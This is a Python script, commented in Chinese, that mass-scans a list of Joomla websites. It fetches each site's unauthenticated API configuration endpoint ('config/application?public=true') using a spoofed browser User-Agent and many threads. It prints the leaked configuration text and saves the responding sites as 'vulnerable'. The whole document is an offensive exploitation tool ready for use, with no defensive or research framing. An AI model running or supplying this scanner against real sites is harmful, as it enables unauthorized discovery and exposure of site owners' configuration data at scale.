import requests
import threading
import time

# 读取目标列表
with open("joomla_targets.txt", "r", encoding="utf-8") as f:
    targets = [line.strip() for line in f if line.strip()]

# 伪装 User-Agent
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
}

# 结果存储
vulnerable_sites = []
lock = threading.Lock()  # 线程锁，防止数据竞争

# 扫描函数（增加超时重试）
def scan(target, retries=3, delay=5):
    url = f"{target}/api/index.php/v1/config/application?public=true"
    for attempt in range(retries):
        try:
            response = requests.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                print(f"[+] 发现可能存在漏洞: {url}")
                print(response.text[:500])  # 只打印前500字符
                with lock:
                    vulnerable_sites.append(url)
                return
            elif response.status_code in [403, 401]:
                print(f"[-] 访问被拒绝: {url}")
                return
            elif response.status_code == 404:
                print(f"[-] API 不存在: {url}")
                return
            else:
                print(f"[?] 未知响应 {response.status_code} - {url}")
                return
        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
            print(f"[!] 超时或连接失败 (尝试 {attempt + 1}/{retries}): {url}")
            time.sleep(delay)  # 等待后重试
        except requests.exceptions.RequestException as e:
            print(f"[!] 请求失败 {url}: {e}")
            return

# 线程管理
threads = []
for target in targets:
    t = threading.Thread(target=scan, args=(target,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

# 保存完整URL
if vulnerable_sites:
    with open("vulnerable_sites.txt", "w") as f:
        for site in vulnerable_sites:
            f.write(site + "\n")
    print("[✔] 可能存在漏洞的完整网址已保存至 vulnerable_sites.txt")